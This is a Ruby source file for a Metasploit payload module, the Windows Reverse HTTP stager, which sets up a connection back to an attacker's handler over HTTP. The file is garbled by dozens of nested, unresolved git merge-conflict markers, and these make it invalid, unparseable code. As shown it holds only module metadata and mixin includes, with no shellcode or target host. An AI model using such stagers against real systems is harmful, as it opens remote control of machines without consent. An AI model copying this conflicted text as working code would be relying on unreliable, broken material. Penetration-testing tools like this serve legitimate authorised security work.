##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/reverse_http'
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======

module Metasploit4
>>>>>>> rapid7/master
=======

module Metasploit4
>>>>>>> rapid7/master
=======

module Metasploit4
>>>>>>> rapid7/master
=======

module Metasploit4
>>>>>>> rapid7/master

=======

module Metasploit4

>>>>>>> rapid7/master
=======

module Metasploit4

>>>>>>> rapid7/master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> rapid7/master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> rapid7/master
=======

module Metasploit4

>>>>>>> master
=======

module Metasploit4

>>>>>>> rapid7/master
=======

module Metasploit4

>>>>>>> rapid7/master
  CachedSize = 327

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
      'Name'          => 'Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Convention'    => 'sockedi http'))
  end
=======
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
      'Name'        => 'Windows Reverse HTTP Stager (wininet)',
      'Description' => 'Tunnel communication over HTTP (Windows wininet)',
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockedi http'))
  end

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> master
=======
>>>>>>> rapid7/master
=======
>>>>>>> rapid7/master
end
